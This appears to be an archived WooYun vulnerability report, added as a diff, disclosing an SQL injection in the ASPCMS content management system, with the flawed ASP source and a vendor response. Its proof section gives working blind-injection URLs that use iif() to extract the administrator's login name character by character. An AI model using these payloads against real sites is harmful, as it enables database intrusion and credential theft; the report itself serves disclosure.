@@ -1,0 +1,323 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ASPCMS存在SQL注入漏洞可获取敏感信息  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ASPCMS存在SQL注入漏洞可获取敏感信息  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/My5t3ry">My5t3ry</a> 
+</li><li>提交时间：		2013-08-15 08:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-15：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-11-13：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ASPCMS系统对用户提交的参数过滤不严，导致攻击者可以提交SQL语句查询数据库获取敏感信息。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞存在于/admin_aspcms/_content/_Content/AspCms_ContentFun.asp，这个文件未验证管理员权限，因此如何人都可以访问，同时该文件对获取的参数没有使用自定义的filterPara函数过滤，导致多处注入，代码入下：<br />
+<br />
+&lt;!--#include file=&quot;../../inc/AspCms_SettingClass.asp&quot; --&gt;<br />
+<br />
+&lt;!--#include file=&quot;../../editor/fckeditor.asp&quot; --&gt;<br />
+<br />
+&lt;%<br />
+<br />
+&#039;die debugmode<br />
+<br />
+dim action : action=getForm(&quot;action&quot;,&quot;get&quot;)<br />
+<br />
+dim ContentID, LanguageID, SortID, GroupID, Exclusive, Title, Title2, TitleColor, IsOutLink, OutLink, Author, ContentSource, ContentTag, Content, ContentStatus, IsTop, IsRecommend, IsImageNews, IsHeadline, IsFeatured, ContentOrder, IsGenerated, Visits, AddTime, ImagePath, IndexImage, DownURL, PageTitle, PageKeywords, PageDesc, PageFileName, spec, EditTime,DownGroupID,IsNoComment,Star,Timeing,TimeStatus,VideoGroupID,CHvalue,SpecCategory<br />
+<br />
+&#039;SpecCategory用于判断是哪个类型的自定义参数<br />
+<br />
+dim sortType, keyword, page, psize, order, ordsc, sortTypeName<br />
+<br />
+sortType=getForm(&quot;sortType&quot;,&quot;get&quot;)<br />
+<br />
+if isnul(sortType) then sortType=0	<br />
+<br />
+sortid=getForm(&quot;sortid&quot;,&quot;post&quot;)	<br />
+<br />
+if isnul(sortid) then sortid=getForm(&quot;sortid&quot;,&quot;get&quot;)<br />
+<br />
+keyword=getForm(&quot;keyword&quot;,&quot;post&quot;)<br />
+<br />
+if isnul(keyword) then keyword=getForm(&quot;keyword&quot;,&quot;get&quot;)<br />
+<br />
+page=getForm(&quot;page&quot;,&quot;get&quot;)<br />
+<br />
+psize=getForm(&quot;psize&quot;,&quot;get&quot;)<br />
+<br />
+order=getForm(&quot;order&quot;,&quot;get&quot;)<br />
+<br />
+ordsc=getForm(&quot;ordsc&quot;,&quot;get&quot;)<br />
+<br />
+DownGroupID=getForm(&quot;DownGroupID&quot;,&quot;post&quot;)<br />
+<br />
+VideoGroupID=getForm(&quot;VideoGroupID&quot;,&quot;post&quot;)<br />
+<br />
+	<br />
+<br />
+select case sortType<br />
+<br />
+	case &quot;2&quot;<br />
+<br />
+		sortTypeName =&quot;文章&quot;<br />
+<br />
+		SpecCategory = &quot;C&quot;<br />
+<br />
+	case &quot;3&quot;<br />
+<br />
+		sortTypeName =&quot;产品&quot;<br />
+<br />
+		SpecCategory = &quot;P&quot;<br />
+<br />
+	case &quot;4&quot;<br />
+<br />
+		sortTypeName =&quot;下载&quot;<br />
+<br />
+		SpecCategory = &quot;DL&quot;<br />
+<br />
+	case &quot;5&quot;<br />
+<br />
+		sortTypeName =&quot;招聘&quot;<br />
+<br />
+		SpecCategory = &quot;HR&quot;<br />
+<br />
+	case &quot;6&quot;<br />
+<br />
+		sortTypeName =&quot;相册&quot;<br />
+<br />
+		SpecCategory = &quot;FO&quot;<br />
+<br />
+<br />
+<br />
+	case &quot;8&quot;<br />
+<br />
+		sortTypeName = &quot;视频&quot;<br />
+<br />
+		SpecCategory = &quot;VI&quot;<br />
+<br />
+		<br />
+<br />
+end select <br />
+<br />
+&#039;单篇1,文章2,产品3,下载4,招聘5,相册6,链接7，视频8<br />
+<br />
+	<br />
+<br />
+Select  case action<br />
+<br />
+	case &quot;add&quot; : addContent	<br />
+<br />
+	case &quot;edit&quot; : editContent	<br />
+<br />
+	case &quot;move&quot; : moveContent<br />
+<br />
+	case &quot;copy&quot; : copyContent<br />
+<br />
+	case &quot;rpost&quot; : rpostContent			<br />
+<br />
+	case &quot;del&quot; : delContent	<br />
+<br />
+	case &quot;recovery&quot; : Recovery	<br />
+<br />
+	case &quot;tdel&quot; : trueDelContent<br />
+<br />
+	case &quot;on&quot; : onOff &quot;on&quot;, &quot;Content&quot;, &quot;ContentID&quot;, &quot;ContentStatus&quot;, &quot;&quot;, getPageName()&amp;&quot;?sortType=&quot;&amp;sortType&amp;&quot;&amp;sortid=&quot;&amp;sortid&amp;&quot;&amp;keyword=&quot;&amp;keyword&amp;&quot;&amp;page=&quot;&amp;page&amp;&quot;&amp;psize=&quot;&amp;psize&amp;&quot;&amp;order=&quot;&amp;order&amp;&quot;&amp;ordsc=&quot;&amp;ordsc<br />
+<br />
+	case &quot;off&quot; : onOff &quot;off&quot;, &quot;Content&quot;, &quot;ContentID&quot;, &quot;ContentStatus&quot;, &quot;&quot;, getPageName()&amp;&quot;?sortType=&quot;&amp;sortType&amp;&quot;&amp;sortid=&quot;&amp;sortid&amp;&quot;&amp;keyword=&quot;&amp;keyword&amp;&quot;&amp;page=&quot;&amp;page&amp;&quot;&amp;psize=&quot;&amp;psize&amp;&quot;&amp;order=&quot;&amp;order&amp;&quot;&amp;ordsc=&quot;&amp;ordsc<br />
+<br />
+	<br />
+<br />
+	case &quot;order&quot; : UpdateOrder<br />
+<br />
+	<br />
+<br />
+End Select<br />
+<br />
+代码略……<br />
+<br />
+Sub trueDelContent<br />
+<br />
+	dim id : id=getForm(&quot;id&quot;,&quot;both&quot;)<br />
+<br />
+	if isnul(id) then alertMsgAndGo &quot;请选择要操作的内容&quot;,&quot;-1&quot;<br />
+<br />
+	if runmode=1 then<br />
+<br />
+		dim rs, sql, filepath<br />
+<br />
+		dim templateobj : set templateobj=new TemplateClass<br />
+<br />
+		sql=&quot;select ContentID,Title,sortType,SortFolder,a.GroupID,ContentFolder,ContentFileName,a.AddTime,a.PageFileName,a.SortID,b.GroupID from {prefix}Content as a, {prefix}Sort as b where a.LanguageID=&quot;&amp;session(&quot;languageID&quot;)&amp;&quot; and a.SortID=b.SortID and ContentStatus=2 and ContentID in(&quot;&amp;id&amp;&quot;)&quot;<br />
+<br />
+		set rs=conn.exec(sql,&quot;r1&quot;)		<br />
+<br />
+		do while not rs.eof<br />
+<br />
+			<br />
+<br />
+			filepath=templateobj.getContentLink(rs(&quot;SortID&quot;),rs(&quot;ContentID&quot;),rs(&quot;SortFolder&quot;),rs(&quot;a.GroupID&quot;),rs(&quot;ContentFolder&quot;),rs(&quot;ContentFileName&quot;),rs(&quot;AddTime&quot;),rs(&quot;PageFileName&quot;),rs(&quot;b.GroupID&quot;))<br />
+<br />
+			if isExistFile(filepath) then delFile filepath		<br />
+<br />
+			&#039;echo filepath&amp;&quot;&lt;br&gt;&quot;<br />
+<br />
+			rs.movenext<br />
+<br />
+		loop<br />
+<br />
+	end if<br />
+<br />
+	conn.exec &quot;delete from {prefix}Content where ContentStatus=2 and ContentID in(&quot;&amp;id&amp;&quot;)&quot;,&quot;exe&quot;<br />
+<br />
+	alertMsgAndGo &quot;彻底删除成功&quot;,getPageName()&amp;&quot;?sortType=&quot;&amp;sortType&amp;&quot;&amp;sortid=&quot;&amp;sortid&amp;&quot;&amp;keyword=&quot;&amp;keyword&amp;&quot;&amp;page=&quot;&amp;page&amp;&quot;&amp;psize=&quot;&amp;psize&amp;&quot;&amp;order=&quot;&amp;order&amp;&quot;&amp;ordsc=&quot;&amp;ordsc<br />
+<br />
+End Sub<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">利用比较简单，利用iif来强制报错：<br />
+<br />
+http://192.168.116.130/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&amp;id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))<br />
+<br />
+查询管理员用户名第一个字符是否为a<br />
+<br />
+如图</p><p class="detail"><a href="../images/141944340d622634aee2e7ec0eb3340dbd1a7d9c.jpg" target="_blank"><img src="../images/141944340d622634aee2e7ec0eb3340dbd1a7d9c.jpg" alt="aspcmssql.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+http://192.168.116.130/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&amp;id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=98),2,chr(97))<br />
+<br />
+查询管理员用户名第一个字符是否为b<br />
+<br />
+如图，返回为假，强制报错：<br />
+<br />
+</p><p class="detail"><a href="../images/141945214ad11541dd60deb234836994627ddad8.jpg" target="_blank"><img src="../images/141945214ad11541dd60deb234836994627ddad8.jpg" alt="aspcmssql2.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤，你懂的 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/My5t3ry" title="My5t3ry">My5t3ry</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034373" title="ASPCMS存在SQL注入漏洞可获取敏感信息">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="34373";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
